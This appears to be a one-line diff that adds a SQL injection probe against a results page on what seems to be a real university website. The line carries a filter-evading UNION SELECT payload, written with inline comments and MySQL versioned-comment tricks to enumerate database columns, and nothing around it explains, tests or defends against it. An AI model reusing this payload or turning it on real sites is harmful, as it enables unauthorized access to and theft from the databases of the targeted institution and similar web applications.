@@ -1,0 +1,2 @@
+
+Query http://www.uprtou.ac.in/result_master.php?id=31/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/1,2,3,4,5,6--+
